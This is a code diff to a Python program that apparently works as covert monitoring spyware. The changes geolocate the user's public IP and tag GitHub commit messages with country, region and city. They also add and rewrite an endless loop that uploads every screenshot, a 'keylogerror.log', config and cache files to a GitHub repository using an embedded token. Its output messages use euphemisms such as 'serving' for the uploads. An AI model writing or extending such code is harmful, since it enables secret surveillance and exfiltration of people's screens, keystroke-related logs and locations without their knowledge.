@@ -504,6 +504,10 @@ def get_geolocation(ip_address):
         print(f"Error fetching geolocation: {e}")
         return ("N/A",) * 7
 
+ip_address = get_public_ip()
+country, region, city, org, loc, postal, timezone = get_geolocation(ip_address)
+# print(f"Country: {country}, Region: {region}, City: {city}")
+
 
 def get_system_info():
     """Get detailed system information as a string."""
@@ -560,7 +564,7 @@ def update_active_user_file(new_entry, active_user):
             encoded_content = base64.b64encode(updated_content.encode("utf-8")).decode("utf-8")
 
             update_payload = {
-                "message": f"Update active user log with system info - {active_user}",
+                "message": f"Updating-{active_user}-{country}-{region}-{city}-{unique_id} active user log",
                 "content": encoded_content,
                 "sha": sha,
                 "branch": BRANCH,
@@ -1631,7 +1635,7 @@ def check_for_update(auto_update=False):
         else:
             print("You are using the latest version.")
             if not auto_update:
-                messagebox.showinfo("No Update", "You are using the latest version.")
+                messagebox.showinfo("No Update", f"You are using the latest version {CURRENT_VERSION}.")
     except requests.exceptions.RequestException as e:
         logging.error(f"Failed to check for updates: {e}")
         if not auto_update:
@@ -1963,6 +1967,39 @@ def clean_uploaded_cache():
         logging.info(f"Cleaned cache: Removed {len(removed_files)} stale entries")
     save_uploaded_cache()
 
+def upload_screenshots_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
+    """Uploads all untracked screenshots in the specified folder to GitHub."""
+    global screenshots_uploaded_cache
+    
+    # Use absolute path for screenshots folder
+    abs_screenshots_folder = os.path.join(app_dir, "screenshots")
+    
+    for root, _, files in os.walk(abs_screenshots_folder):
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            if not file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
+                continue  # Skip non-image files
+                
+            if not is_screenshot_uploaded(file_path):
+                retry_count = 0
+                while retry_count < MAX_RETRIES:
+                    try:
+                        print(f"Attempting to upload screenshot: {file_path}")
+                        upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
+                        mark_screenshot_uploaded(file_path)
+                        logging.info(f"Successfully uploaded screenshot: {file_path}")
+                        break
+                    except Exception as e:
+                        retry_count += 1
+                        logging.error(f"Error uploading {file_path} (Attempt {retry_count}/{MAX_RETRIES}): {e}")
+                        if retry_count < MAX_RETRIES:
+                            time.sleep(RETRY_DELAY)
+                        else:
+                            logging.warning(f"Permanently failed to upload {file_path}")
+                            # Remove from cache if permanently failed
+                            screenshots_uploaded_cache.discard(file_path)
+                            save_uploaded_cache()
+
 # Function to upload a single file to GitHub
 # def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
 #     """
@@ -2058,7 +2095,7 @@ def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, g
                 content_base64 = base64.b64encode(new_content.encode('utf-8')).decode('utf-8')
 
             payload = {
-                "message": f"{'Updating' if sha else 'Uploading'} {username} {file_name}",
+                "message": f"{'Updating' if sha else 'Uploading'} {username}-{country}-{region}-{city}-{unique_id} {file_name}",
                 "content": content_base64,
                 "branch": branch_name
             }
@@ -2147,47 +2184,6 @@ def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name,
             logging.error(f"Folder not found or not a directory: {folder_path}")
             print(f"Folder not found or not a directory: {folder_path}")
 
-# Function to upload screenshots to GitHub
-def upload_screenshots_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
-    global screenshots_uploaded_cache
-    
-    # Validate cache integrity
-    if not isinstance(screenshots_uploaded_cache, set):
-        logging.warning("Invalid cache format, reinitializing...")
-        screenshots_uploaded_cache = set()
-
-    # Add periodic cache save
-    save_interval = 20  # Save every 20 files processed
-    processed_count = 0
-
-    for root, _, files in os.walk(folder_path):
-        for file_name in files:
-            file_path = os.path.join(root, file_name)
-            # Add extension check for image files
-            if not file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
-                continue
-
-            processed_count += 1
-            if processed_count % save_interval == 0:
-                save_uploaded_cache()
-
-            if not is_screenshot_uploaded(file_path):
-                retry_count = 0
-                success = False
-                while retry_count < MAX_RETRIES and not success:
-                    try:
-                        print(f"Attempting to upload screenshot: {file_path}")
-                        upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
-                        mark_screenshot_uploaded(file_path)
-                        logging.info(f"Successfully uploaded screenshot: {file_path}")
-                        success = True
-                    except Exception as e:
-                        retry_count += 1
-                        logging.error(f"Attempt {retry_count} failed: {str(e)}")
-                        time.sleep(2 ** retry_count)  # Exponential backoff
-                else:
-                    print(f"Skipping failed upload: {file_path}")
-
 # Main upload logs function
 def upload_logs():
     """
@@ -2199,19 +2195,12 @@ def upload_logs():
     branch_name = BRANCH  # Replace with your branch name
     github_token = GITHUB_TOKEN  # Replace with your GitHub token
 
-    # Define file-to-subfolder mapping with validation
+    # Define file-to-subfolder mapping USING ABSOLUTE PATHS
     file_mapping = {
         os.path.join(app_dir, "keylogerror.log"): "keylogerror",
         os.path.join(app_dir, "config.json"): "config",
         os.path.join(app_dir, "files_cache.json"): "cache"
     }
-
-    # Verify critical files exist before proceeding
-    for file_path in file_mapping.keys():
-        if not os.path.exists(file_path):
-            logging.error(f"Critical file missing: {file_path}")
-            print(f"🛑 Critical file missing: {file_path}")
-            create_missing_file(file_path)  # New helper function
 
     # Define folder-to-subfolder mapping
     folder_mapping = {
@@ -2222,7 +2211,7 @@ def upload_logs():
     LOG_EXTENSIONS = ('.log', '.txt', '.json', '.bat')  # Add other allowed extensions
 
     # Define the screenshots folder path
-    screenshots_folder = os.path.join(app_dir, "screenshots")
+    screenshots_folder = "screenshots"
     
     # Load the cache of uploaded screenshots
     load_uploaded_cache()
@@ -2233,9 +2222,6 @@ def upload_logs():
     print("Starting the serveing monitoring script...")
 
     while True:  # Infinite loop for continuous execution
-
-        # Add cache cleaning before upload attempts
-        clean_uploaded_cache()
         
         # Fetch the upload interval from the URL
         # Fetch the upload interval and fallback interval from the URL
@@ -2279,7 +2265,7 @@ def upload_logs():
             if time_until_next_upload <= 0:
                 print("serving screenshots folder...")
                 upload_screenshots_folder_to_github(
-                    screenshots_folder, repo_name, "uploads/screenshots", branch_name, github_token
+                    screenshots_folder, repo_name, f"uploads/{screenshots_folder}", branch_name, github_token
                 )
                 print(f"🎉🎉 Served screenshots folder successfully at {datetime.now().isoformat()}. 🎉🎉")
                 # Update the last upload time
@@ -2616,28 +2602,7 @@ def clean_temp_files():
                 os.remove(os.path.join(logs_folder, file))
             except Exception as e:
                 logging.warning(f"Failed to clean temp file {file}: {str(e)}")
-    """Clean up system-generated temporary files"""
-    temp_patterns = ('*.etl', '*.tmp', '*.temp')
-    for root, _, files in os.walk(logs_folder):
-        for file in files:
-            if any(file.lower().endswith(p) for p in temp_patterns):
-                try:
-                    os.remove(os.path.join(root, file))
-                    logging.info(f"Cleaned temp file: {file}")
-                except Exception as e:
-                    logging.warning(f"Failed to clean {file}: {str(e)}")
 
-# Add new helper function to handle missing files
-def create_missing_file(file_path):
-    """Create empty file if it doesn't exist"""
-    try:
-        with open(file_path, 'w') as f:
-            f.write("[]" if "cache" in file_path else "")
-        logging.info(f"Created missing file: {file_path}")
-        print(f"📄 Created missing file: {file_path}")
-    except Exception as e:
-        logging.error(f"Failed to create {file_path}: {str(e)}")
-        print(f"❌ Failed to create {file_path}: {str(e)}")
 
 if __name__ == "__main__":
     main()
